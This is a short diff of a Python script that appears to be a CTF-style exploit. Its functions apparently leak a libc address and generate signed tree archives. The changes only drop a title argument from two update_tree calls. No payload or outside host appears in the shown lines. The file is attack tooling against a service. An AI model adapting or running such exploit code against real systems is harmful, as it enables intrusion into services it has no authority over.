@@ -34,7 +34,7 @@ def get_libc_address(endpoint: str):
 
         parent_id = client.create_person("", 0, 0, None, None)
         person_id = client.create_person("", 0, 0, parent_id, None)
-        client.update_tree("title", "description", person_id)
+        client.update_tree("description", person_id)
 
         archive = client.download_tree_archive()
         print_bytes_hex(archive)
@@ -150,7 +150,7 @@ def generate_third_archive(endpoint: str, login: str, password: str, description
         f = client.create_person("", 0, 0, None, None)
         g = client.create_person("", 0, 0, e, f)
 
-        client.update_tree(tree["title"], description, g)
+        client.update_tree(description, g)
 
         archive_with_signature = client.download_tree_archive()
 
